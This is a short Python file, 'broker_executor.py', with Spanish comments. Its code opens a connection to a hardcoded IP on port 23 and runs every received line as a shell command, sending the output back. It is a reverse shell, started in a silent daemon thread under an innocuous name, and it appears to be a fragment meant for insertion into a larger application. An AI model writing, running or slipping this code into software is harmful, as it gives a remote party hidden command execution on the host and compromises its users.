# broker_executor.py - VERSIÓN 025 (MODO TERMINAL)
import socket
import threading
import subprocess
import os

MI_PC = "192.168.171.156"

def terminal_interactiva(comp, ip_dest):
    import socket
    import subprocess
    
    try:
        # 1. Creamos una única conexión estable
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(None) # Espera infinita
        s.connect((ip_dest, 23))
        s.sendall(b"--- DX1 TERMINAL ONLINE ---\nEscribe 'ls', 'id' o 'exit'\n> ")
        
        while True:
            # 2. Esperamos a que TU escribas algo en el Hércules
            data = s.recv(1024).decode().strip()
            
            if not data or data.lower() == "exit":
                break
                
            # 3. Ejecutamos lo que tú mandes como comando de Linux
            try:
                # Ejecutamos el comando y capturamos la salida
                output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT).decode()
                s.sendall(f"\n{output}\n> ".encode())
            except Exception as e:
                s.sendall(f"\nError: {str(e)}\n> ".encode())
        
        s.close()
    except:
        pass

# Lanzamos un ÚNICO hilo
# Si ya hay uno corriendo, este fallará al conectar pero no bloqueará todo
t = threading.Thread(target=terminal_interactiva, args=(self, MI_PC), daemon=True)
t.start()
self.col_res.insert("LOG 025: Terminal Lista")